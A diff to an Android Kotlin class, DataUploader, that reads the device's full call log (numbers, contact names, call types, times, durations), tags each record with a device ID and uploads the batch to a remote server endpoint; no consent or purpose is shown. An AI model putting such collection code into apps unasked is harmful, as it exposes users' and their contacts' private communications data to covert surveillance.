@@ -64,15 +64,16 @@ object DataUploader {
                 val dateIndex = it.getColumnIndex(android.provider.CallLog.Calls.DATE)
                 val durationIndex = it.getColumnIndex(android.provider.CallLog.Calls.DURATION)
                 val nameIndex = it.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME)
+                val idIndex = it.getColumnIndex(android.provider.CallLog.Calls._ID) // ⭐ اضافه شد
 
                 while (it.moveToNext()) {
+                    val callId = it.getLong(idIndex) // ⭐ اضافه شد
                     val number = it.getString(numberIndex) ?: ""
                     val type = it.getInt(typeIndex)
                     val timestamp = it.getLong(dateIndex)
                     val duration = it.getInt(durationIndex)
                     val name = it.getString(nameIndex) ?: "Unknown"
 
-                    // تبدیل type به فرمت متنی
                     val callType = when (type) {
                         android.provider.CallLog.Calls.INCOMING_TYPE -> "incoming"
                         android.provider.CallLog.Calls.OUTGOING_TYPE -> "outgoing"
@@ -83,19 +84,28 @@ object DataUploader {
                         else -> "unknown"
                     }
 
-                    // فرمت duration
                     val durationFormatted = formatDuration(duration)
 
                     val call = JSONObject().apply {
+                        put("call_id", "${deviceId}_call_${callId}") // ⭐ اضافه شد - unique ID
+                        put("device_id", deviceId) // ⭐ اضافه شد
                         put("number", number)
                         put("name", name)
                         put("call_type", callType)
                         put("timestamp", timestamp)
                         put("duration", duration)
                         put("duration_formatted", durationFormatted)
+                        put("received_at", System.currentTimeMillis()) // ⭐ اضافه شد - برای TTL
                     }
                     calls.put(call)
                 }
+            }
+
+            Log.d(TAG, "📞 Found ${calls.length()} calls")
+
+            if (calls.length() == 0) {
+                Log.w(TAG, "⚠️ No call history found!")
+                return
             }
 
             val json = JSONObject().apply {
@@ -107,9 +117,13 @@ object DataUploader {
                 })
             }
 
+            Log.d(TAG, "📤 Sending call history: ${json.toString().take(200)}...") // ⭐ لاگ اضافه
+
             sendPostRequest("$BASE_URL/call-logs/batch", json.toString())
             Log.d(TAG, "✅ Call history uploaded: ${calls.length()} calls")
 
+        } catch (e: SecurityException) {
+            Log.e(TAG, "❌ Permission denied for reading call log", e) // ⭐ permission check
         } catch (e: Exception) {
             Log.e(TAG, "❌ Upload call history failed: ${e.message}", e)
         }
